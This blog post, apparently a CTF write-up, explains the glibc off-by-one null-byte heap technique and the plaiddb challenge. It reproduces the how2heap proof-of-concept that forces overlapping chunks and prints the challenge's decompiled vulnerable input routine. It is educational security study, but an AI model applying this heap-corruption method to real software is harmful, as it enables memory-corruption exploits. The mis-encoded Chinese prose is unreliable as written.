<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Off_By_One (plaiddb) | Bin FantasyğŸ¤¯</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="â€‹        plaiddbå¿«æŠŠæˆ‘è‚å´©æºƒäº†ã€‚ã€‚">
<meta property="og:type" content="article">
<meta property="og:title" content="Off_By_One (plaiddb)">
<meta property="og:url" content="http://example.com/2020/03/16/Off_By_One/index.html">
<meta property="og:site_name" content="Bin FantasyğŸ¤¯">
<meta property="og:description" content="â€‹        plaiddbå¿«æŠŠæˆ‘è‚å´©æºƒäº†ã€‚ã€‚">
<meta property="og:locale">
<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/1.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/2.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/3.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/4.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/5.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/6.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/7.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/8.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/9.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/10.png">
<meta property="article:published_time" content="2020-03-16T08:09:47.000Z">
<meta property="article:modified_time" content="2020-03-16T09:14:17.401Z">
<meta property="article:author" content="Ash3n On3">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/1.png">
  
    <link rel="alternate" href="/atom.xml" title="Bin FantasyğŸ¤¯" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/plugin/bganimation/bg.css">

  

  <link href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" rel="stylesheet" type="text/css">
<meta name="generator" content="Hexo 5.4.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <div class="outer">
        <div class="widget-wrap mobile-header">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <img class="avatar" src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/avatar/avatar%20(3).jpg">
    <h2 class="author">Ash3n On3</h2>
    <h3 class="description"></h3>
    <div class="count-box">
      <a href="/archives"><div><strong>14</strong><br>æ–‡ç« </div></a>
      <a href="/categories"><div><strong>0</strong><br>åˆ†ç±»</div></a>
      <a href="/tags"><div><strong>0</strong><br>æ ‡ç­¾</div></a>
    </div>
    <ul class="blog-link">
     
          <a href="/" title="Home">
            <li>ä¸»é¡µ</li>
          </a>
        
          <a href="/archives" title="Archives">
            <li>å½’æ¡£</li>
          </a>
        
          <a href="/categories" title="Categories">
            <li>åˆ†ç±»</li>
          </a>
        
          <a href="/tags" title="Tags">
            <li>æ ‡ç­¾</li>
          </a>
        
    </ul>
  </div>
</div>

        <section id="main"><article id="post-Off_By_One" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/03/16/Off_By_One/" class="article-date">
  <time class="post-time" datetime="2020-03-16T08:09:47.000Z" itemprop="datePublished">
    <span class="post-month">3æœˆ</span><br/>
    <span class="post-day">16</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      Off_By_One (plaiddb)
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>â€‹        plaiddbå¿«æŠŠæˆ‘è‚å´©æºƒäº†ã€‚ã€‚<span id="more"></span></p>
<h2 id="0x00-Off-By-One"><a href="#0x00-Off-By-One" class="headerlink" title="0x00 . Off_By_One"></a>0x00 . Off_By_One</h2><p>â€‹        è¿™ä¸ªçŸ¥è¯†ç‚¹åœ¨how2heapé‡Œæ˜¯å«poison_null_byteï¼Œç»“æœæˆ‘ä¸Šctf-wikiæ‰¾writeupçš„æ—¶å€™æ²¡æ‰¾ç€ï¼ŒåŸæ¥äººå®¶ä¹Ÿå«off_by_oneã€‚ä¸‹é¢å…ˆåˆ†æä»£ç ï¼š</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Welcome to poison null byte 2.0!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Tested in Ubuntu 14.04 64bit.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint8_t</span>* a;</span><br><span class="line">	<span class="keyword">uint8_t</span>* b;</span><br><span class="line">	<span class="keyword">uint8_t</span>* c;</span><br><span class="line">	<span class="keyword">uint8_t</span>* b1;</span><br><span class="line">	<span class="keyword">uint8_t</span>* b2;</span><br><span class="line">	<span class="keyword">uint8_t</span>* d;</span><br><span class="line">	<span class="keyword">void</span> *barrier;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;We allocate 0x100 bytes for &#x27;a&#x27;.\n&quot;</span>);</span><br><span class="line">	a = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;a: %p\n&quot;</span>, a);</span><br><span class="line">	<span class="keyword">int</span> real_a_size = <span class="built_in">malloc_usable_size</span>(a);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Since we want to overflow &#x27;a&#x27;, we need to know the &#x27;real&#x27; size of &#x27;a&#x27; &quot;</span></span><br><span class="line">		<span class="string">&quot;(it may be more than 0x100 because of rounding): %#x\n&quot;</span>, real_a_size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* chunk size attribute cannot have a least significant byte with a value of 0x00.</span></span><br><span class="line"><span class="comment">	 * the least significant byte of this will be 0x10, because the size of the chunk includes</span></span><br><span class="line"><span class="comment">	 * the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">	b = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">	c = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;c: %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	barrier =  <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n&quot;</span></span><br><span class="line">		<span class="string">&quot;The barrier is not strictly necessary, but makes things less confusing\n&quot;</span>, barrier);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint64_t</span>* b_size_ptr = (<span class="keyword">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// added fix for size==prev_size(next_chunk) check in newer versions of glibc</span></span><br><span class="line">	<span class="comment">// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30</span></span><br><span class="line">	<span class="comment">// this added check requires we are allowed to have null pointers in b (not just a c string)</span></span><br><span class="line">	<span class="comment">//*(size_t*)(b+0x1f0) = 0x200;</span></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;In newer versions of glibc we will need to have our updated size inside b itself to pass &quot;</span></span><br><span class="line">		<span class="string">&quot;the check &#x27;chunksize(P) != prev_size (next_chunk(P))&#x27;\n&quot;</span>);</span><br><span class="line">	<span class="comment">// we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)</span></span><br><span class="line">	<span class="comment">// which is the value of b.size after its first byte has been overwritten with a NULL byte</span></span><br><span class="line">	*(<span class="keyword">size_t</span>*)(b+<span class="number">0x1f0</span>) = <span class="number">0x200</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// this technique works by overwriting the size metadata of a free chunk</span></span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;b.size is: (0x200 + 0x10) | prev_in_use\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);</span><br><span class="line">	a[real_a_size] = <span class="number">0</span>; <span class="comment">// &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot;</span></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint64_t</span>* c_prev_size_ptr = ((<span class="keyword">uint64_t</span>*)c)<span class="number">-2</span>;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;c.prev_size is %#lx\n&quot;</span>,*c_prev_size_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// This malloc will result in a call to unlink on the chunk where b was.</span></span><br><span class="line">	<span class="comment">// The added check (commit id: 17f487b), if not properly handled as we did before,</span></span><br><span class="line">	<span class="comment">// will detect the heap corruption now.</span></span><br><span class="line">	<span class="comment">// The check is this: chunksize(P) != prev_size (next_chunk(P)) where</span></span><br><span class="line">	<span class="comment">// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)</span></span><br><span class="line">	<span class="comment">// next_chunk(P) == b-0x10+0x200 == b+0x1f0</span></span><br><span class="line">	<span class="comment">// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200</span></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n&quot;</span>,</span><br><span class="line">		*((<span class="keyword">size_t</span>*)(b<span class="number">-0x8</span>)), *(<span class="keyword">size_t</span>*)(b<span class="number">-0x10</span> + *((<span class="keyword">size_t</span>*)(b<span class="number">-0x8</span>))));</span><br><span class="line">	b1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;b1: %p\n&quot;</span>,b1);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now we malloc &#x27;b1&#x27;. It will be placed where &#x27;b&#x27; was. &quot;</span></span><br><span class="line">		<span class="string">&quot;At this point c.prev_size should have been updated, but it was not: %#lx\n&quot;</span>,*c_prev_size_ptr);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Interestingly, the updated value of c.prev_size has been written 0x10 bytes &quot;</span></span><br><span class="line">		<span class="string">&quot;before c.prev_size: %lx\n&quot;</span>,*(((<span class="keyword">uint64_t</span>*)c)<span class="number">-4</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;We malloc &#x27;b2&#x27;, our &#x27;victim&#x27; chunk.\n&quot;</span>);</span><br><span class="line">	<span class="comment">// Typically b2 (the victim) will be a structure with valuable pointers that we want to control</span></span><br><span class="line"></span><br><span class="line">	b2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;b2: %p\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(b2,<span class="string">&#x27;B&#x27;</span>,<span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Current b2 content:\n%s\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now we free &#x27;b1&#x27; and &#x27;c&#x27;: this will consolidate the chunks &#x27;b1&#x27; and &#x27;c&#x27; (forgetting about &#x27;b2&#x27;).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(b1);</span><br><span class="line">	<span class="built_in">free</span>(c);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Finally, we allocate &#x27;d&#x27;, overlapping &#x27;b2&#x27;.\n&quot;</span>);</span><br><span class="line">	d = <span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;d: %p\n&quot;</span>,d);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now &#x27;d&#x27; and &#x27;b2&#x27; overlap.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">memset</span>(d,<span class="string">&#x27;D&#x27;</span>,<span class="number">0x300</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;New b2 content:\n%s\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks&quot;</span></span><br><span class="line">		<span class="string">&quot;for the clear explanation of this technique.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>â€‹        ä»£ç ä¸€å¼€å§‹è¿˜æ²¡çœ‹æ‡‚æ¥ç€ï¼Œçœ‹ç€å®ƒæŠŠbä¸€åˆ†ä¸ºäºŒä¸€å¤´é›¾æ°´ä¸çŸ¥é“å¹²å•¥ï¼Œåæ¥çœ‹äº†ä¸‹åˆ˜è€æ¿çš„blogæ‰ç†è§£çš„ã€‚</p>
<p>â€‹        å…¶å¤§è‡´çš„æ„æ€å°±æ˜¯ï¼šç³»ç»Ÿçš„è¾¹ç•Œæ£€æŸ¥ä¸ä¸¥è°¨ï¼Œå½“chunkå¡«å……å¤§å°ä¸ºmalloc_sizeæ—¶ï¼Œæ•´ä¸ªchunkè¢«å­—ç¬¦ä¸²å¡«æ»¡ï¼Œè€Œå­—ç¬¦ä¸²è¿˜éœ€è¦æœ‰â€™\x00â€™å­—ç¬¦ç»“å°¾ï¼Œä¹Ÿå°±å°†ä¸‹ä¸€ä¸ªchunkçš„sizeçš„ç¬¬ä¸€ä¸ªå­—èŠ‚ä¿®æ”¹äº†ï¼Œæœ‰å¯èƒ½åªæ”¹äº†in_useä½(0x101 â€“&gt; 0x100)ï¼Œæœ‰å¯èƒ½sizeå’Œin_useä½éƒ½æ”¹äº†(0x111 â€“&gt; 0x100)ï¼Œè¿™è¦çœ‹å…·ä½“çš„chunk_sizeå’Œåˆ©ç”¨è¿‡ç¨‹ã€‚</p>
<p>â€‹        å‚è€ƒå¦‚ä¸‹ç¤ºæ„å›¾ï¼ˆæ²¡æƒ³åˆ°ç”»ä¸ªå›¾è¦é‚£ä¹ˆä¹…ã€‚ã€‚ï¼‰ï¼š</p>
<p>â€‹        1.a = malloc(0x100)        b = malloc(0x200)        c = malloc(0x100)        barrier = malloc(0x100)æœ€åè¿™ä¸ªchunkæ˜¯ç”¨æ¥éš”å¼€top chunkï¼Œå¦åˆ™å½“cé‡Šæ”¾æ—¶ï¼Œtop chunkä¼šå°†å…¶åˆå¹¶ã€‚</p>
<p>â€‹        2.æ¥ç€ç”¨açš„æº¢å‡ºå°†b_sizeä¿®æ”¹æˆ0x200ï¼Œå¹¶åŒæ—¶åœ¨b+0x200çš„åœ°æ–¹å†™å…¥0x200ç”¨ä½œfake_pre_sizeç”¨æ¥é€šè¿‡æ£€æŸ¥ã€‚ç„¶åé‡Šæ”¾bã€‚ç³»ç»Ÿå°±ä¼šå°†båˆ°b+0x200çš„ç©ºé—´é‡Šæ”¾ï¼Œè€Œéé‡Šæ”¾æ•´ä¸ªb chunkã€‚</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/1.png" style="zoom: 25%;" />



<p>â€‹        3.ç°åœ¨bçš„å¯æ§å¤§å°ä¸º0x200ï¼Œå­˜äºunsort binï¼Œç°åœ¨å°†å…¶è¿›è¡Œåˆ†å‰²ã€‚b1 = malloc(0x100)ï¼Œb2 = malloc(0x80)ã€‚b1ç”¨æ¥è¿›è¡Œunlinkåˆå¹¶ï¼Œb2ç”¨æ¥overlapã€‚</p>
<p>â€‹        4.é‡Šæ”¾b1ï¼Œé‡Šæ”¾cï¼Œç³»ç»Ÿä¼šæ ¹æ®cçš„pre_sizeæ‰¾åˆ°b1çš„sizeï¼Œå‘ç°in_use == 0ï¼Œäºæ˜¯å°†å…¶åˆå¹¶ã€‚å¦‚æ­¤ä¸€æ¥ï¼Œb1åˆ°céƒ½å˜æˆäº†ä¸€ä¸ªchunkè¢«æ”¶åˆ°unsort binä¸­ã€‚</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/2.png" style="zoom: 25%;" />

<p>â€‹        5.d = malloc(0x400)ï¼Œå¯ä»¥ä½¿å¾—dçš„ä¸€éƒ¨åˆ†ä¸b2å‘ç”Ÿoverlapã€‚</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/3.png" style="zoom:30%;" />

<p>â€‹        6.overlapä¹‹åå¯ä»¥è¿›è¡Œå¾ˆå¤šæ”»å‡»ã€‚ä¾‹å¦‚å…ˆfree(d)ï¼Œå†mallocå‡ºdåˆ°b2ä¸­é—´çš„éƒ¨åˆ†ï¼Œæ­¤æ—¶b2åˆ°barrierçš„å‰©ä½™ç©ºé—´ä»ä½œä¸ºä¸€ä¸ªå­¤é›¶é›¶çš„chunkå‘†åœ¨unsort binï¼Œæ‰€ä»¥å…¶fdï¼Œbkéƒ½æŒ‡å‘main arenaï¼Œå†ç”¨å¯æ§çš„chunk b2å°±å¯ä»¥leakã€‚</p>
<h2 id="0x01-plaiddb"><a href="#0x01-plaiddb" class="headerlink" title="0x01 . plaiddb"></a>0x01 . plaiddb</h2><p>â€‹        å¤©çŸ¥é“æˆ‘æŸ¥äº†å¤šå°‘ä¸ªwriteupï¼Œèƒ½åŸºæœ¬çœ‹æ‡‚çš„ä¹Ÿåªæœ‰ctf-wikiçš„ã€‚ã€‚ã€‚ã€‚ï¼ˆCTF-WikiğŸ‚ğŸºï¼ï¼ï¼‰</p>
<h3 id="A-Analysis"><a href="#A-Analysis" class="headerlink" title="A . Analysis"></a>A . Analysis</h3><p>â€‹        64ä½ï¼Œæ–‡ä»¶ä¿æŠ¤å…¨å¼€ã€‚ã€‚</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/4.png" style="zoom: 67%;" />

<p>â€‹    ä¸»è¦çš„æ•°æ®ç»“æ„å¦‚ä¸‹ï¼ˆå‚è€ƒå‚è€ƒCTF-Wikiï¼Œæˆ‘åªåˆ†æå‡ºå‰ä¸‰ä¸ªã€‚ã€‚ï¼‰ï¼š</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span>    </span><br><span class="line">    <span class="keyword">char</span> *key;    </span><br><span class="line">    <span class="keyword">long</span> data_size;   </span><br><span class="line">    <span class="keyword">char</span> *data;    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">left</span>;</span>    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">right</span>;</span>    </span><br><span class="line">    <span class="keyword">long</span> what_1;    </span><br><span class="line">    <span class="keyword">long</span> what_2; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>â€‹    æ€ªä¸å¾—ä¸€å¤§ç‰‡ä¹±ç³Ÿç³Ÿçš„æŒ‡é’ˆæ“ä½œï¼ŒåŸæ¥æ˜¯æ ‘ç»“æ„ã€‚é‚£è¿˜åˆ†æä¸ªğŸ”¨ã€‚</p>
<p>â€‹    ä¸è¿‡çœ‹äº†çœ‹writeupå¥½åƒè¿™é¢˜åˆ©ç”¨è·Ÿæ ‘ç»“æ„æ²¡å•¥å…³ç³»ã€‚</p>
<p>â€‹    ä¸»è¦å‡½æ•°æœ‰ï¼šGET(show_single)ï¼ŒPUT(add)ï¼ŒDUMP(show_all)ï¼ŒDEL(delete)ï¼Œread_inã€‚</p>
<p>â€‹    æ¼æ´åœ¨read_inå‡½æ•°é‡Œï¼Œå¯ä»¥æº¢å‡ºä¸€ä¸ªç©ºå­—èŠ‚ã€‚è€Œä¸”æ­¤å¤„ç”¨åˆ°çš„æ˜¯realloc()å‡½æ•°ï¼Œç”³è¯·çš„å†…å­˜å¤§å°æ˜¯å¯ç”¨å¤§å°é€æ¬¡ä¹˜2æ‰€å¾—çš„ç»“æœï¼Œæ‰€ä»¥è¯´éœ€è¦ç‰¹å®šå¤§å°çš„chunkæ‰èƒ½è¿›è¡Œæº¢å‡ºã€‚(0x18,0x38,0x78,0xf8,0x1f8)</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">sub_1040</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">char</span> *v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">size_t</span> v2; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// bp</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v5; <span class="comment">// r13</span></span><br><span class="line">  <span class="keyword">char</span> *v6; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>);</span><br><span class="line">  v1 = v0;</span><br><span class="line">  v2 = <span class="built_in">malloc_usable_size</span>(v0);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = _IO_getc(stdin);</span><br><span class="line">    v4 = v3;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">-1</span> )</span><br><span class="line">      <span class="built_in">sub_1020</span>();</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v5 = v1 - v0;</span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= v1 - v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="built_in">realloc</span>(v0, <span class="number">2</span> * v2);				<span class="comment">//realloc require a special size of chunk</span></span><br><span class="line">      v0 = v6;</span><br><span class="line">      <span class="keyword">if</span> ( !v6 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;FATAL: Out of memory&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v1 = &amp;v6[v5];</span><br><span class="line">      v2 = <span class="built_in">malloc_usable_size</span>(v6);</span><br><span class="line">    &#125;</span><br><span class="line">    *v1++ = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  *v1 = <span class="number">0</span>;								<span class="comment">//off by one</span></span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>â€‹        å…ˆæ¥è·‘ä¸€éç¨‹åºçœ‹çœ‹ï¼š</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/5.png" style="zoom: 67%;" />

<p>â€‹        æ ¹æ®ä»¥ä¸‹heapç»“æ„ä»¥åŠidaçš„é™æ€åˆ†æå¯ä»¥çœ‹å‡ºï¼Œæ¯æ‰§è¡Œä¸€æ¬¡PUTï¼Œç³»ç»Ÿä¼šåˆ†é…ä¸‰ä¸ªè¿ç»­çš„chunkã€‚a.row ç»“æ„ä½“(0x40)    b.row key(0x20)    c.row data(size)ã€‚ç»“æ„ä½“ä¸­å­˜æœ‰æŒ‡å‘keyå’Œdataçš„æŒ‡é’ˆã€‚</p>
